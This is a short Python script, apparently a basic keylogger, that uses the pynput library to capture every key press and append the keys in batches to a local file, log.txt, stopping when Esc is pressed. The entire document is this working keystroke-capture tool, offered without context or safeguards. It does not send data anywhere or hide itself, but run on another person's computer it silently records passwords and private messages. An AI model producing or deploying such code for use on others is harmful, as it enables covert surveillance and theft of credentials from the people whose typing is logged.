import pynput

from pynput.keyboard import Key, Listener

keys = []
count = 0

def on_press(key):
    global keys, count

    if key == Key.backspace:
        key = "BKS"
    keys.append(key)
    count = count +1
    if count >= 5:
        keyLog()


def on_release(key):
    if key==Key.esc:
        return False

def keyLog():
    global keys, count
    with open("log.txt", "a") as file:
        for key in keys:
            file.write(str(key))
        count = 0
        keys=[]


with Listener (on_press=on_press, on_release=on_release) as listener:
    listener.join()
